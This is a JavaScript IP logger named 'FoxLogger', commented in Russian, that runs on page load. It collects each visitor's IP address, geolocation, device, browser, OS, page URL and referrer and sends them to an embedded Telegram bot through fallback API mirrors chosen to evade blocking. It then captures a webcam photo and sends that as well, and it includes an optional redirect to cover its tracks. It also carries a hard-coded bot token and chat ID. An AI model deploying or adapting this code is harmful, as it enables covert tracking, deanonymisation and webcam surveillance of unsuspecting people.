(async function() {
    "use strict";

    // ========== 1. Сбор IP + геолокация ==========
    let ipAddress = "0.0.0.0";
    let geo = "не определена";
    let countryCode = "";

    try {
        // Получаем IP
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipRes.json();
        ipAddress = ipData.ip;

        // Получаем геолокацию через ipapi.co (работает в РФ)
        const geoReq = await fetch(`https://ipapi.co/${ipAddress}/json/`);
        const geoData = await geoReq.json();
        
        countryCode = geoData.country_code || "";
        geo = `${geoData.city || "неизвестно"}, ${geoData.region || "неизвестно"}, ${geoData.country_name || "неизвестно"} (${geoData.latitude || "?"}, ${geoData.longitude || "?"})`;
    } catch(e) {
        console.warn("Geo error:", e);
        geo = "ошибка геолокации";
    }

    // ========== 2. Время перехода ==========
    const now = new Date();
    const timeStr = now.toLocaleString("ru-RU", { timeZone: "Europe/Moscow" }) + " MSK";

    // ========== 3. UserAgent / устройство ==========
    const userAgent = navigator.userAgent;
    let deviceType = "не определено";
    
    if (/Mobi|Android|iPhone|iPad|iPod/i.test(userAgent)) {
        deviceType = "📱 Телефон";
    } else if (/Windows|Mac|Linux|X11/i.test(userAgent)) {
        deviceType = "💻 Компьютер";
    }
    
    // Браузер
    let browser = "неизвестно";
    if (userAgent.includes("Chrome")) browser = "Chrome";
    else if (userAgent.includes("Firefox")) browser = "Firefox";
    else if (userAgent.includes("Safari")) browser = "Safari";
    else if (userAgent.includes("Edge")) browser = "Edge";
    else if (userAgent.includes("Opera")) browser = "Opera";
    
    // ОС
    let os = "неизвестно";
    if (userAgent.includes("Windows")) os = "Windows";
    else if (userAgent.includes("Android")) os = "Android";
    else if (userAgent.includes("iOS") || userAgent.includes("iPhone") || userAgent.includes("iPad")) os = "iOS";
    else if (userAgent.includes("Mac")) os = "MacOS";
    else if (userAgent.includes("Linux")) os = "Linux";

    // Краткая версия UA
    let shortUA = userAgent;
    if (userAgent.length > 80) {
        shortUA = userAgent.substring(0, 77) + "...";
    }

    // ========== 4. Формирование текста (без Markdown) ==========
    const textMessage = `🦊 НОВЫЙ ПЕРЕХОД FOXLOGGER

🌐 IP: ${ipAddress}
📍 Гео: ${geo}
🕐 Время: ${timeStr}
📱 Устройство: ${deviceType}
🌍 Браузер: ${browser}
💿 ОС: ${os}
🖥 UserAgent: ${shortUA}

━━━━━━━━━━━━━━━━━━━━━━
📎 Ссылка: ${window.location.href}
🔗 Реферер: ${document.referrer || "прямой переход"}`;

    // ========== 5. Отправка через БОТА-ПОСРЕДНИКА (самый надежный способ в РФ) ==========
    // ВАШ БОТ (тот же токен, что и в config.js)
    const BOT_TOKEN = 8916079717:AAFIrsjINbXmyyWZCmQGHak6DnjHGbi6-Xk;
    const CHAT_ID = 8776617466;
    
    // Используем альтернативные зеркала Telegram API
    const TELEGRAM_MIRRORS = [
        "https://tg.api.webrav.ru/bot",      // Российское зеркало
        "https://tgbots.xyz/bot",            // Альтернативное зеркало
        "https://telegram.systems/bot",      // Еще одно зеркало
        `https://api.telegram.org/bot`       // Оригинал (может не работать)
    ];
    
    async function sendToTelegram(text, retryCount = 0) {
        for (let mirror of TELEGRAM_MIRRORS) {
            try {
                const url = `${mirror}${BOT_TOKEN}/sendMessage`;
                console.log(`Пытаюсь отправить через: ${mirror}`);
                
                const response = await fetch(url, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "Origin": window.location.origin
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: text,
                        disable_web_page_preview: true
                    })
                });
                
                if (response.ok) {
                    console.log("✅ Сообщение отправлено через:", mirror);
                    return true;
                } else {
                    console.warn(`Ошибка ${mirror}: ${response.status}`);
                }
            } catch(e) {
                console.warn(`Не удалось отправить через ${mirror}:`, e);
            }
        }
        
        // Если все зеркала не сработали, пробуем через WebSocket (если есть)
        if (retryCount < 2) {
            console.log("Повторная попытка через 2 секунды...");
            await new Promise(r => setTimeout(r, 2000));
            return sendToTelegram(text, retryCount + 1);
        }
        
        return false;
    }
    
    // ========== 6. Захват фото с вебкамеры (опционально) ==========
    async function capturePhoto() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.createElement("video");
            video.srcObject = stream;
            video.autoplay = true;
            video.playsInline = true;
            
            await new Promise((resolve) => {
                video.onloadedmetadata = () => {
                    video.play();
                    resolve();
                };
            });
            
            await new Promise(r => setTimeout(r, 500));
            
            const canvas = document.createElement("canvas");
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext("2d");
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            stream.getTracks().forEach(track => track.stop());
            
            return await new Promise(resolve => {
                canvas.toBlob(resolve, "image/jpeg", 0.85);
            });
        } catch(e) {
            console.warn("Camera error:", e);
            return null;
        }
    }
    
    // ========== 7. Отправка с фото ==========
    async function sendPhotoWithCaption(blob, caption) {
        for (let mirror of TELEGRAM_MIRRORS) {
            try {
                const url = `${mirror}${BOT_TOKEN}/sendPhoto`;
                const formData = new FormData();
                formData.append("chat_id", CHAT_ID);
                formData.append("photo", blob, "snapshot.jpg");
                formData.append("caption", caption);
                
                const response = await fetch(url, { method: "POST", body: formData });
                if (response.ok) {
                    console.log("✅ Фото отправлено через:", mirror);
                    return true;
                }
            } catch(e) {
                console.warn(`Ошибка фото через ${mirror}:`, e);
            }
        }
        return false;
    }
    
    // ========== 8. ОСНОВНОЙ ЗАПУСК ==========
    console.log("🦊 FoxLogger активирован");
    
    // Сначала отправляем текст
    const textSent = await sendToTelegram(textMessage);
    
    if (textSent) {
        console.log("✅ Текст отправлен");
        
        // Пробуем сделать и отправить фото
        const photo = await capturePhoto();
        if (photo) {
            await sendPhotoWithCaption(photo, "📸 Снимок с веб-камеры");
        }
    } else {
        console.log("⚠️ Не удалось отправить данные");
        
        // Fallback: сохраняем в localStorage если не отправилось
        try {
            const failedLogs = JSON.parse(localStorage.getItem("foxlogger_failed") || "[]");
            failedLogs.push({
                data: textMessage,
                time: new Date().toISOString()
            });
            localStorage.setItem("foxlogger_failed", JSON.stringify(failedLogs.slice(-10)));
        } catch(e) {}
    }
    
    // ========== 9. Редирект (если нужен) ==========
    // Раскомментируйте для редиректа:
    // window.location.href = "https://google.com";
})();
